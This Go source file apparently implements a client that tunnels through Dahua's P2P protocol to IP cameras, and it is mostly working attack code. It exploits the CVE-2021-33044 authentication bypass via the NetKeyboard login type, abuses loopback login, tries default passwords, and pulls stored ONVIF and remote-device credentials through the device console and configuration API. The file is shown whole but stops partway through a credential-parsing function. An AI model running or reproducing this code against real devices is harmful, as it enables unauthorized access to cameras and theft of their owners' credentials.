package p2p

import (
	"bytes"
	"crypto/md5"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

type PTCPTunnel struct {
	client   *DHClient
	realm    uint32
	recvBufs map[uint32][]byte
	conn     *net.UDPConn
	addr     string
	session  *PTCPSession
	user     string
	pass     string
	sendMu   sync.Mutex
}

func newTunnel(c *DHClient, conn *net.UDPConn, addr string, session *PTCPSession) *PTCPTunnel {
	return &PTCPTunnel{
		client:   c,
		realm:    rand.Uint32(),
		recvBufs: make(map[uint32][]byte),
		conn:     conn,
		addr:     addr,
		session:  session,
		user:     "",
		pass:     "",
	}
}

func (t *PTCPTunnel) readOneDataForRealm(realm uint32, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}
	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 65536)
	for {
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return nil, fmt.Errorf("read: %w", err)
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			t.sendACK()
			return nil, fmt.Errorf("disconnected")
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, pErr := ParsePayloadBody(pkt.Body)
			if pErr != nil {
				continue
			}
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			t.sendACK()
			return payload, nil
		}
	}
}

func (c *DHClient) NewTunnel() *PTCPTunnel {
	return newTunnel(c, c.mainConn, c.agentAddr, c.ptcpSession)
}

func (c *DHClient) NewDirectTunnel() *PTCPTunnel {
	return newTunnel(c, c.deviceConn, c.deviceRAddr, c.devicePTCPSession)
}

func (t *PTCPTunnel) SetAuth(user, pass string) {
	t.user = user
	t.pass = pass
}

const dataSegmentMax = 1280

func (t *PTCPTunnel) SendDataWithRealm(data []byte, realm uint32) error {
	t.sendMu.Lock()
	defer t.sendMu.Unlock()
	for len(data) > 0 {
		n := len(data)
		if n > dataSegmentMax {
			n = dataSegmentMax
		}
		payloadBody := MakePayloadBody(realm, data[:n])
		pkt := t.session.Send(payloadBody)
		if err := t.client.sendTo(t.conn, t.addr, pkt.Serialize()); err != nil {
			return err
		}
		data = data[n:]
	}
	return nil
}

func (t *PTCPTunnel) ReadData(timeout time.Duration) ([]byte, error) {
	conn := t.conn
	var out []byte

	if len(t.recvBufs[t.realm]) > 0 {
		out = t.recvBufs[t.realm]
		delete(t.recvBufs, t.realm)
	}

	conn.SetReadBuffer(512 * 1024)

	deadline := time.Now().Add(timeout)
	resultDeadline := deadline

	buf := make([]byte, 65536)
	for time.Now().Before(resultDeadline) {
		conn.SetReadDeadline(resultDeadline)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			if len(out) > 0 {
				return out, nil
			}
			return nil, fmt.Errorf("read tunnel: %w", err)
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		ackNow := true

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}

		bt := pkt.Body[0]

		if bt == 0x12 && len(pkt.Body) >= 16 {
			disc := string(pkt.Body[12:16])
			if disc == "DISC" {
				discRealm := binary.BigEndian.Uint32(pkt.Body[4:8])
				if discRealm != t.realm {
					t.sendACK()
					continue
				}
				t.sendACK()
				if len(out) > 0 {
					return out, nil
				}
				return nil, fmt.Errorf("tunnel disconnected")
			}
		}

		if bt == 0x13 {
			t.sendACK()
			continue
		}

		if bt == 0x10 || (bt&0xF0) == 0x10 {
			realm, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				if ackNow {
					t.sendACK()
				}
				continue
			}
			if realm != t.realm {
				t.recvBufs[realm] = append(t.recvBufs[realm], payload...)
				if ackNow {
					t.sendACK()
				}
				continue
			}
			t.sendACK()
			out = append(out, payload...)
			newDeadline := time.Now().Add(100 * time.Millisecond)
			if newDeadline.Before(resultDeadline) {
				resultDeadline = newDeadline
			}
			continue
		}

		if ackNow {
			t.sendACK()
		}
	}

	if len(out) > 0 {
		return out, nil
	}
	return nil, fmt.Errorf("read tunnel: timeout")
}

func (t *PTCPTunnel) sendACK() {
	t.sendMu.Lock()
	ackPkt := t.session.Send([]byte{})
	serialised := ackPkt.Serialize()
	t.sendMu.Unlock()
	t.client.sendTo(t.conn, t.addr, serialised)
}

func (t *PTCPTunnel) DoBindToPort(realm uint32, port int) error {
	return t.doBindWithTarget(realm, fmt.Sprintf("127.0.0.1:%d", port))
}

func (t *PTCPTunnel) doBindWithTarget(realm uint32, target string) error {
	host, portStr, _ := net.SplitHostPort(target)
	var port int
	fmt.Sscanf(portStr, "%d", &port)

	ip := net.ParseIP(host)
	portU32 := uint32(port)

	bindBody := make([]byte, 20)
	bindBody[0] = 0x11
	binary.BigEndian.PutUint32(bindBody[4:8], realm)
	binary.BigEndian.PutUint32(bindBody[12:16], portU32)
	copy(bindBody[16:20], ip.To4())

	t.sendMu.Lock()
	pkt := t.session.Send(bindBody)
	serialised := pkt.Serialize()
	t.sendMu.Unlock()

	conn := t.conn
	destAddr := t.addr

	if err := t.client.sendTo(conn, destAddr, serialised); err != nil {
		return fmt.Errorf("bind send: %w", err)
	}

	deadline := time.Now().Add(10 * time.Second)
	respBuf := make([]byte, 65536)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(deadline)
		n, _, err := conn.ReadFrom(respBuf)
		if err != nil {
			return fmt.Errorf("bind wait: %w", err)
		}

		resp, pErr := ParsePTCPPacket(respBuf[:n])
		if pErr != nil {
			continue
		}

		t.sendMu.Lock()
		t.session.Receive(resp)
		t.sendMu.Unlock()

		if len(resp.Body) == 0 {
			t.sendACK()
			continue
		}

		bt := resp.Body[0]
		if bt == 0x13 {
			t.sendACK()
			continue
		}

		if bt == 0x12 {
			t.sendACK()
			if len(resp.Body) >= 8 {
				respRealm := binary.BigEndian.Uint32(resp.Body[4:8])
				if respRealm == realm {
					return nil
				}
			} else {
				return nil
			}
		}
	}

	return fmt.Errorf("bind timeout waiting for realm 0x%08x", realm)
}

func (t *PTCPTunnel) DisconnectRealm(realm uint32) {
	discBody := make([]byte, 16)
	discBody[0] = 0x12
	binary.BigEndian.PutUint32(discBody[4:8], realm)
	copy(discBody[12:16], []byte("DISC"))
	pkt := t.session.Send(discBody)
	t.client.sendTo(t.conn, t.addr, pkt.Serialize())

	t.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 65536)
	for {
		n, _, err := t.conn.ReadFrom(buf)
		if err != nil {
			break
		}
		if rpkt, e := ParsePTCPPacket(buf[:n]); e == nil {
			t.session.Receive(rpkt)
		}
	}
}

func (t *PTCPTunnel) ReadDataForRealm(realm uint32, timeout time.Duration) ([]byte, error) {
	oldRealm := t.realm
	t.realm = realm
	defer func() { t.realm = oldRealm }()
	return t.ReadData(timeout)
}

func (t *PTCPTunnel) SDKExchangeSingle(realm uint32, cmd []byte, timeout time.Duration) ([]byte, error) {
	if err := t.SendDataWithRealm(cmd, realm); err != nil {
		return nil, fmt.Errorf("sdk send: %w", err)
	}
	resp, err := t.readDataSkipDisc(realm, timeout)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func (t *PTCPTunnel) readDataSkipDisc(realm uint32, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	deadline := time.Now().Add(timeout)

	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}

	var result []byte
	resultDeadline := deadline

	buf := make([]byte, 65536)
	for time.Now().Before(resultDeadline) {
		conn.SetReadDeadline(resultDeadline)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			break
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			t.sendACK()
			continue
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				t.sendACK()
				continue
			}
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			result = append(result, payload...)
			t.sendACK()
			resultDeadline = time.Now().Add(200 * time.Millisecond)
		}
	}

	if len(result) == 0 {
		return nil, fmt.Errorf("read: timeout waiting for realm 0x%08x data", realm)
	}
	return result, nil
}

func (t *PTCPTunnel) Disconnect() error {
	discBody := make([]byte, 16)
	discBody[0] = 0x12
	binary.BigEndian.PutUint32(discBody[4:8], t.realm)
	copy(discBody[12:16], []byte("DISC"))

	pkt := t.session.Send(discBody)
	return t.client.sendTo(t.conn, t.addr, pkt.Serialize())
}

func (t *PTCPTunnel) DoHTTP(req []byte, timeout time.Duration) ([]byte, error) {
	return t.doHTTP(req, timeout)
}

func parseWWWAuthHeaders(respStr string) []string {
	var authHeaders []string
	for _, line := range strings.Split(respStr, "\r\n") {
		if strings.HasPrefix(line, "WWW-Authenticate:") || strings.HasPrefix(line, "www-authenticate:") {
			v := strings.TrimPrefix(strings.TrimPrefix(line, "WWW-Authenticate:"), "www-authenticate:")
			v = strings.TrimSpace(v)
			if v != "" {
				authHeaders = append(authHeaders, v)
			}
		}
	}
	return authHeaders
}

func (t *PTCPTunnel) DoHTTPAuth(req []byte, timeout time.Duration) ([]byte, error) {
	reqStr := string(req)
	noAuthReq := removeAuthHeader(reqStr)
	resp, err := t.doHTTP([]byte(noAuthReq), timeout)
	if err != nil {
		return nil, err
	}

	respStr := string(resp)
	if !strings.Contains(respStr, "401 Unauthorized") {
		return resp, nil
	}

	authHeaders := parseWWWAuthHeaders(respStr)
	if len(authHeaders) == 0 {
		return resp, nil
	}
	selected := selectAuthHeader(reqStr, authHeaders, t.user, t.pass)
	if selected == "" {
		return resp, nil
	}

	authReq := insertAuthHeader(reqStr, selected)
	return t.doHTTP([]byte(authReq), timeout)
}

func (t *PTCPTunnel) DoHTTPAuthStrict(req []byte, timeout time.Duration) ([]byte, error) {
	realm1 := rand.Uint32()
	if err := t.doBind(realm1); err != nil {
		return nil, fmt.Errorf("bind: %w", err)
	}
	defer t.DisconnectRealm(realm1)

	reqStr := string(req)
	noAuthReq := removeAuthHeader(reqStr)
	resp, err := t.DoHTTPOnRealm(realm1, []byte(noAuthReq), timeout)
	if err != nil {
		return nil, err
	}

	respStr := string(resp)
	if !strings.Contains(respStr, "401 Unauthorized") {
		return nil, fmt.Errorf("endpoint is unauthenticated (no 401 challenge)")
	}

	authHeaders := parseWWWAuthHeaders(respStr)
	if len(authHeaders) == 0 {
		return nil, fmt.Errorf("no auth headers in 401 response")
	}

	// Try Digest variants on fresh realm
	for variant := 0; variant < 4; variant++ {
		selected := selectAuthHeaderVariant(reqStr, authHeaders, t.user, t.pass, variant)
		if selected == "" {
			continue
		}
		authReq := insertAuthHeader(reqStr, selected)
		realm2 := rand.Uint32()
		if err := t.doBind(realm2); err != nil {
			continue
		}
		authResp, authErr := t.DoHTTPOnRealm(realm2, []byte(authReq), timeout)
		t.DisconnectRealm(realm2)
		if authErr == nil && len(authResp) > 0 {
			resStr := string(authResp)
			if strings.Contains(resStr, "200 OK") && !strings.Contains(resStr, "401 Unauthorized") && !strings.Contains(resStr, "Invalid Authority") {
				return authResp, nil
			}
		}
	}

	// Try Basic Auth fallback on fresh realm
	basicAuth := basicAuthHeader(t.user, t.pass)
	authReq := insertAuthHeader(reqStr, basicAuth)
	realmBasic := rand.Uint32()
	if err := t.doBind(realmBasic); err == nil {
		authResp, authErr := t.DoHTTPOnRealm(realmBasic, []byte(authReq), timeout)
		t.DisconnectRealm(realmBasic)
		if authErr == nil && len(authResp) > 0 && strings.Contains(string(authResp), "200 OK") && !strings.Contains(string(authResp), "401 Unauthorized") && !strings.Contains(string(authResp), "Invalid Authority") {
			return authResp, nil
		}
	}

	return nil, fmt.Errorf("authentication failed")
}

func (t *PTCPTunnel) readHTTPPayload(realm uint32, out []byte, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	if timeout > 0 {
		conn.SetReadDeadline(time.Now().Add(timeout))
	} else {
		conn.SetReadDeadline(time.Time{})
	}

	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}

	buf := make([]byte, 65536)
	for {
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return nil, err
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			discRealm := binary.BigEndian.Uint32(pkt.Body[4:8])
			if discRealm != realm {
				t.sendACK()
				continue
			}
			t.sendACK()
			if len(out) > 0 {
				return out, nil
			}
			return nil, fmt.Errorf("disconnected")
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				t.sendACK()
				continue
			}
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			t.sendACK()
			return payload, nil
		}
		t.sendACK()
	}
}

func (t *PTCPTunnel) DoHTTPOnRealm(realm uint32, req []byte, timeout time.Duration) ([]byte, error) {
	if err := t.SendDataWithRealm(req, realm); err != nil {
		return nil, fmt.Errorf("send http on realm: %w", err)
	}

	var fullResp []byte
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		data, err := t.readHTTPPayload(realm, fullResp, 2*time.Second)
		if err != nil {
			if len(fullResp) > 0 {
				return fullResp, nil
			}
			if time.Now().After(deadline) {
				return nil, fmt.Errorf("read http on realm: %w", err)
			}
			continue
		}
		fullResp = append(fullResp, data...)

		headerEnd := findHeaderEnd(fullResp)
		if headerEnd < 0 {
			continue
		}

		headers := string(fullResp[:headerEnd])
		headersLower := strings.ToLower(headers)
		body := fullResp[headerEnd:]
		bodyLen := len(body)

		// Content-Length check
		cl := parseContentLength(headers)
		if cl > 0 {
			if bodyLen >= cl {
				return fullResp, nil
			}
			continue
		}

		// Chunked Transfer Encoding check
		if strings.Contains(headersLower, "transfer-encoding: chunked") {
			if bytes.HasSuffix(body, []byte("0\r\n\r\n")) || bytes.Contains(body, []byte("\r\n0\r\n\r\n")) {
				return fullResp, nil
			}
			continue
		}

		// JPEG image stream check
		if strings.Contains(headersLower, "image/jpeg") || (len(body) >= 2 && body[0] == 0xFF && body[1] == 0xD8) {
			if containsJPEGEnd(body) {
				for {
					extra, eErr := t.readHTTPPayload(realm, fullResp, 40*time.Millisecond)
					if eErr != nil || len(extra) == 0 {
						break
					}
					fullResp = append(fullResp, extra...)
				}
				return fullResp, nil
			}
			continue
		}

		// standard text/error/JSON response
		if strings.Contains(headers, "401 Unauthorized") || strings.Contains(headers, "403 Forbidden") || strings.Contains(headers, "404 Not Found") ||
			strings.Contains(headers, "400 Bad Request") || strings.Contains(headers, "500 Internal Server Error") ||
			strings.Contains(headersLower, "text/") || strings.Contains(headersLower, "application/") ||
			bytes.Contains(body, []byte("table.")) || bytes.Contains(body, []byte("users[")) || bytes.Contains(body, []byte("user.Name=")) ||
			bytes.Contains(body, []byte("result")) || bytes.Contains(body, []byte("version=")) || bytes.Contains(body, []byte("type=")) {
			for {
				extra, eErr := t.readHTTPPayload(realm, fullResp, 40*time.Millisecond)
				if eErr != nil || len(extra) == 0 {
					break
				}
				fullResp = append(fullResp, extra...)
			}
			return fullResp, nil
		}
	}

	if len(fullResp) > 0 {
		return fullResp, nil
	}
	return nil, fmt.Errorf("read http on realm: timeout")
}

type DHIPClient struct {
	tunnel *PTCPTunnel
	realm  uint32
	sess   int
}

var dhipMagic = []byte{0x20, 0x00, 0x00, 0x00, 0x44, 0x48, 0x49, 0x50}

func (t *PTCPTunnel) NewDHIPClientOnPort(port int) (*DHIPClient, error) {
	realm := rand.Uint32()
	if err := t.doBindWithTarget(realm, fmt.Sprintf("127.0.0.1:%d", port)); err != nil {
		return nil, fmt.Errorf("dhip bind: %w", err)
	}
	return &DHIPClient{tunnel: t, realm: realm}, nil
}

func (c *DHIPClient) Close() {
	c.tunnel.DisconnectRealm(c.realm)
}

func (c *DHIPClient) Session() int {
	return c.sess
}

func (c *DHIPClient) send(method string, params any, id int, object any) error {
	body := map[string]any{
		"method":  method,
		"params":  params,
		"id":      id,
		"session": c.sess,
	}
	if object != nil {
		body["object"] = object
	}
	raw, _ := json.Marshal(body)

	hdr := make([]byte, 32)
	copy(hdr[0:8], dhipMagic)
	binary.LittleEndian.PutUint32(hdr[8:12], uint32(c.sess))
	binary.LittleEndian.PutUint32(hdr[12:16], uint32(id))
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(raw)))
	binary.LittleEndian.PutUint32(hdr[24:28], uint32(len(raw)))

	return c.tunnel.SendDataWithRealm(append(hdr, raw...), c.realm)
}

func (c *DHIPClient) readPacket(timeout time.Duration) (map[string]any, error) {
	deadline := time.Now().Add(timeout)
	buf := c.tunnel.recvBufs[c.realm]
	delete(c.tunnel.recvBufs, c.realm)

	var magicIdx int
	for {
		magicIdx = bytes.Index(buf, dhipMagic)
		if magicIdx >= 0 && len(buf[magicIdx:]) >= 32 {
			break
		}
		chunk, err := c.tunnel.readOneDataForRealm(c.realm, time.Until(deadline))
		if err != nil {
			if len(buf) > 0 {
				c.tunnel.recvBufs[c.realm] = buf
			}
			return nil, fmt.Errorf("dhip read header: %w", err)
		}
		buf = append(buf, chunk...)
	}

	buf = buf[magicIdx:]

	bodyLen := int(binary.LittleEndian.Uint32(buf[16:20]))
	if bodyLen > 10*1024*1024 {
		return nil, fmt.Errorf("dhip body too large: %d", bodyLen)
	}

	totalNeeded := 32 + bodyLen
	for len(buf) < totalNeeded {
		chunk, err := c.tunnel.readOneDataForRealm(c.realm, time.Until(deadline))
		if err != nil {
			if len(buf) > 0 {
				c.tunnel.recvBufs[c.realm] = buf
			}
			return nil, fmt.Errorf("dhip read body: %w", err)
		}
		buf = append(buf, chunk...)
	}

	bodyRaw := buf[32:totalNeeded]
	if len(buf) > totalNeeded {
		c.tunnel.recvBufs[c.realm] = buf[totalNeeded:]
	}

	if bodyLen == 0 {
		return map[string]any{}, nil
	}

	var pkt map[string]any
	if err := json.Unmarshal(bodyRaw, &pkt); err != nil {
		return nil, fmt.Errorf("dhip json: %w", err)
	}
	return pkt, nil
}

const sweepCallTimeout = 5 * time.Second

func (c *DHIPClient) Call(method string, params any, id int, object any, notifies *[]map[string]any) (map[string]any, error) {
	return c.CallT(method, params, id, object, notifies, 15*time.Second)
}

func (c *DHIPClient) CallT(method string, params any, id int, object any, notifies *[]map[string]any, timeout time.Duration) (map[string]any, error) {
	if err := c.send(method, params, id, object); err != nil {
		return nil, err
	}
	deadline := time.Now().Add(timeout)
	for {
		rem := time.Until(deadline)
		if rem <= 0 {
			return nil, fmt.Errorf("dhip call timeout for %s", method)
		}
		pkt, err := c.readPacket(rem)
		if err != nil {
			return nil, err
		}
		respID, _ := pkt["id"].(float64)
		if int(respID) == id {
			return pkt, nil
		}
		if notifies != nil {
			*notifies = append(*notifies, pkt)
		}
	}
}

func (c *DHIPClient) Login() error {
	if err := c.LoginNetKeyboard(); err == nil {
		return nil
	}
	return c.LoginLoopback()
}

func (c *DHIPClient) LoginNormal(user, pass string) error {
	emptyLogin := func(id int) (map[string]any, error) {
		return c.Call("global.login", map[string]any{
			"userName":   user,
			"password":   "",
			"clientType": "Web3.0",
			"loginType":  "Direct",
		}, id, nil, nil)
	}
	r, err := emptyLogin(20)
	if err != nil {
		return fmt.Errorf("dhip login challenge: %w", err)
	}
	if result, _ := r["result"].(bool); result {
		if r2, err2 := emptyLogin(20); err2 == nil {
			if res2, _ := r2["result"].(bool); !res2 {
				r = r2
			}
		}
		if result, _ := r["result"].(bool); result {
			c.sess = dhipSessInt(r["session"])
			return nil
		}
	}
	params, _ := r["params"].(map[string]any)
	realm, _ := params["realm"].(string)
	random, _ := params["random"].(string)
	c.sess = dhipSessInt(r["session"])
	if realm == "" || random == "" {
		return fmt.Errorf("dhip login: no challenge received")
	}
	hash := StandardRPCHash(user, pass, realm, random)
	r2, err := c.Call("global.login", map[string]any{
		"userName":      user,
		"password":      hash,
		"clientType":    "Console",
		"loginType":     "Direct",
		"ipAddr":        "127.0.0.1",
		"authorityType": "Default",
		"passwordType":  "Default",
		"realm":         realm,
		"random":        random,
	}, 21, nil, nil)
	if err != nil {
		return fmt.Errorf("dhip login response: %w", err)
	}
	if result, _ := r2["result"].(bool); result {
		c.sess = dhipSessInt(r2["session"])
		return nil
	}
	raw, _ := json.Marshal(r2)
	return fmt.Errorf("dhip normal login rejected resp=%s", string(raw))
}

// CVE-2021-33044
func (c *DHIPClient) LoginNetKeyboard() error {

	r, err := c.Call("global.login", map[string]any{
		"userName":      "admin",
		"password":      "Not Used",
		"clientType":    "NetKeyboard",
		"loginType":     "Direct",
		"authorityType": "Default",
		"passwordType":  "Default",
	}, 1, nil, nil)
	if err != nil {
		return fmt.Errorf("dhip login send: %w", err)
	}
	if result, _ := r["result"].(bool); result {
		c.sess = dhipSessInt(r["session"])
		return nil
	}

	params, _ := r["params"].(map[string]any)
	realm, _ := params["realm"].(string)
	random, _ := params["random"].(string)
	challengeSess := dhipSessInt(r["session"])
	c.sess = challengeSess

	if realm != "" && random != "" {

		for _, pwd := range []string{"", "admin"} {
			h1 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", realm, pwd)))
			h2 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", random, h1)))
			r2, err := c.Call("global.login", map[string]any{
				"userName":      "admin",
				"password":      h2,
				"clientType":    "NetKeyboard",
				"loginType":     "Direct",
				"passwordType":  "Default",
				"authorityType": "Default",
			}, 1, nil, nil)
			if err != nil {
				continue
			}
			if result, _ := r2["result"].(bool); result {
				c.sess = dhipSessInt(r2["session"])
				return nil
			}
		}
	}

	return fmt.Errorf("dhip netkeyboard login failed (realm=%s)", realm)
}

func (c *DHIPClient) LoginLoopback() error {
	r, err := c.Call("global.login", map[string]any{
		"userName":      "admin",
		"password":      "Not Used",
		"clientType":    "Local",
		"loginType":     "Loopback",
		"ipAddr":        "127.0.0.1",
		"authorityType": "Default",
		"passwordType":  "Default",
	}, 1, nil, nil)
	if err != nil {
		return fmt.Errorf("dhip loopback login send: %w", err)
	}
	if result, _ := r["result"].(bool); result {
		c.sess = dhipSessInt(r["session"])
		return nil
	}

	params, _ := r["params"].(map[string]any)
	realm, _ := params["realm"].(string)
	random, _ := params["random"].(string)
	challengeSess := dhipSessInt(r["session"])
	c.sess = challengeSess

	if realm == "" || random == "" {
		return fmt.Errorf("dhip loopback: no challenge received")
	}

	for _, pwd := range []string{"admin", ""} {
		r3, err := c.CallT("global.login", map[string]any{
			"userName":      "admin",
			"password":      pwd,
			"clientType":    "Local",
			"loginType":     "Loopback",
			"ipAddr":        "127.0.0.1",
			"passwordType":  "Plain",
			"authorityType": "Default",
		}, 1, nil, nil, sweepCallTimeout)
		if err != nil {
			continue
		}
		if result, _ := r3["result"].(bool); result {
			c.sess = dhipSessInt(r3["session"])
			return nil
		}
	}

	for _, pwd := range []string{"admin", ""} {
		h1 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", realm, pwd)))
		h2 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", random, h1)))
		r4, err := c.CallT("global.login", map[string]any{
			"userName":      "admin",
			"password":      h2,
			"clientType":    "Local",
			"loginType":     "Loopback",
			"ipAddr":        "127.0.0.1",
			"passwordType":  "Default",
			"authorityType": "Default",
		}, 1, nil, nil, sweepCallTimeout)
		if err != nil {
			continue
		}
		if result, _ := r4["result"].(bool); result {
			c.sess = dhipSessInt(r4["session"])
			return nil
		}
	}

	return fmt.Errorf("dhip loopback: all login paths failed (realm=%s)", realm)
}

func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
	loopParams := func(pwd, enc string) map[string]any {
		return map[string]any{
			"userName": "admin", "password": pwd,
			"clientType": "Local", "loginType": "Loopback", "ipAddr": "127.0.0.1",
			"authorityType": "Default", "passwordType": enc,
		}
	}
	sessOf := func(r map[string]any) int {
		if s, ok := r["session"].(float64); ok && s != 0 {
			return int(s)
		}
		if p, ok := r["params"].(map[string]any); ok {
			if s, ok := p["session"].(float64); ok && s != 0 {
				return int(s)
			}
		}
		return 0
	}
	realmOf := func(r map[string]any) string {
		if p, ok := r["params"].(map[string]any); ok {
			if s, ok := p["realm"].(string); ok {
				return s
			}
		}
		return ""
	}
	c.sess = 0
	candidates := []string{"", "admin", "888888", "123456"}

	for _, pwd := range candidates {
		r, err := c.CallT("global.login", loopParams(pwd, "Plain"), 1, nil, nil, sweepCallTimeout)
		if err != nil {
			continue
		}
		if ok, _ := r["result"].(bool); ok {
			if s := sessOf(r); s != 0 {
				c.sess = s
				return realmOf(r), nil
			}
		}
		if chSess := sessOf(r); chSess != 0 {
			if realm := realmOf(r); realm != "" {
				c.sess = chSess
				for _, cpwd := range candidates {
					r2, err2 := c.CallT("global.login", loopParams(cpwd, "Plain"), 2, nil, nil, sweepCallTimeout)
					if err2 != nil {
						continue
					}
					if res2, _ := r2["result"].(bool); res2 {
						if s2 := sessOf(r2); s2 != 0 {
							c.sess = s2
						}
						return realm, nil
					}
				}
			}
		}
	}

	rProbe, err := c.CallT("global.login", map[string]any{
		"userName": "admin", "password": "",
		"clientType": "Web3.0", "loginType": "Direct",
	}, 1, nil, nil, sweepCallTimeout)
	if err == nil {
		if realm := realmOf(rProbe); realm != "" {
			if chSess := sessOf(rProbe); chSess != 0 {
				c.sess = chSess
				for _, pwd := range candidates {
					r2, err2 := c.CallT("global.login", loopParams(pwd, "Plain"), 2, nil, nil, sweepCallTimeout)
					if err2 != nil {
						continue
					}
					if res2, _ := r2["result"].(bool); res2 {
						if s2 := sessOf(r2); s2 != 0 {
							c.sess = s2
						}
						return realm, nil
					}
				}
			}
		}
	}

	return "", fmt.Errorf("loopback login failed")
}

func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
	r, err := c.Call("console.factory.instance", nil, 4, nil, nil)
	if err != nil || r["result"] == nil {
		return "", "", false
	}
	obj := r["result"]

	if _, err := c.Call("console.attach", map[string]any{"proc": obj}, 8, obj, nil); err != nil {
		return "", "", false
	}

	commands := []string{"OnvifUser -u", "OnvifUser -l", "OnvifUser"}
	for _, cmd := range commands {
		var notifies []map[string]any
		r2, err := c.Call("console.runCmd", map[string]any{"command": cmd}, 6, obj, &notifies)
		if err != nil {
			continue
		}
		if ok, _ := r2["result"].(bool); !ok {
			continue
		}
		if user, pass, ok := parseOnvifNotifies(notifies); ok {
			return user, pass, true
		}
	}
	return "", "", false
}

func (c *DHIPClient) ExtractCredsViaConfig() (string, string, bool) {
	r, err := c.Call("configManager.getConfig", map[string]any{"name": "RemoteDevice"}, 5, nil, nil)
	if err != nil {
		return "", "", false
	}
	params, _ := r["params"].(map[string]any)
	if params == nil {
		return "", "", false
	}
	table, _ := params["table"].(map[string]any)
	if table == nil {
		return "", "", false
	}
	for _, raw := range table {
		m, _ := raw.(map[string]any)
		if m == nil {
			continue
		}
		user, _ := m["UserName"].(string)
		pass, _ := m["Password"].(string)
		if user != "" && pass != "" {
			return user, pass, true
		}
	}
	return "", "", false
}

func parseOnvifNotifies(notifies []map[string]any) (string, string, bool) {
	for _, n := range notifies {
		params, _ := n["params"].(map[string]any)
		if params == nil {
			continue
		}
		info, _ := params["info"].(map[string]any)
		if info == nil {
			continue
		}
		dataRaw, _ := info["Data"].([]any)
		var output string
		for _, line := range dataRaw {
			s, _ := line.(string)
			output += s
		}
		if output == "" {
			continue
		}

		if user, pass, ok := extractCredsFromJSON(output); ok {
			return user, pass, true
		}

		if user, pass, ok := extractCredsFromLines(output); ok {
			return user, pass, true
		}
	}
	return "", "", false
}

func extractCredsFromJSON(output string) (string, string, bool) {
	for i := 0; i < len(output); i++ {
		if output[i] != '{' {
			continue
		}
		var u struct {
			Name     string `json:"Name"`
			Password string `json:"Password"`
		}
		if err := json.NewDecoder(strings.NewReader(output[i:])).Decode(&u); err != nil {
			continue
		}
		if u.Name != "" && u.Password != "" {
			return u.Name, u.Password, true
		}
	}
	return "", "", false
}

func stripDecor(s string) string {
	v := strings.TrimSpace(s)
	v = strings.TrimSuffix(v, ",")
	v = strings.TrimSpace(v)
	if len(v) >= 2 && strings.HasPrefix(v, "\"") && strings.HasSuffix(v, "\"") {
		v = v[1 : len(v)-1]
	}
	return v
}

func extractCredsFromLines(output string) (string, string, bool) {
	lines := strings.Split(output, "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Name") && i+1 < len(lines) {
			nextLine := strings.TrimSpace(lines[i+1])
			if strings.HasPrefix(nextLine, "Password") {
				parts := strings.SplitN(line, ":", 2)
				passParts := strings.SplitN(nextLine, ":", 2)
